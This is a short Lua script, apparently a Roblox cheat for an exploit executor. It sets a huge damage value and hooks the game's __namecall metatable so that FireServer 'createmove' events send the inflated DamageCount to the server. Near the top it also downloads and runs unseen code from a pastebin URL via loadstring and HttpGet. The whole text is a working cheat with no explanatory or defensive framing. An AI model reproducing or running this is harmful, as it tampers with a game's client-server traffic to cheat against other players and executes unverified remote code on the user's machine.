_G.Damage = 100000
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vJg6Sa8w", true))()
end)
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__namecall
mt.__namecall = newcclosure(loadstring([[
    local old = ...
    return function(self, ...)
        local len = select("#", ...)
        local pack = {...}
        local args = {}
        for i=1,len do
            args[i] = pack[i]
        end
        local method = getnamecallmethod()
        if method == "FireServer" and tostring(self) == "createevent" and args[1] == "createmove" then
            warn("megumu gang!")
			args[2]["DamageCount"] = _G.Damage
			return old(self, unpack(args))
		end
        return old(self, ...)
    end
]])(old))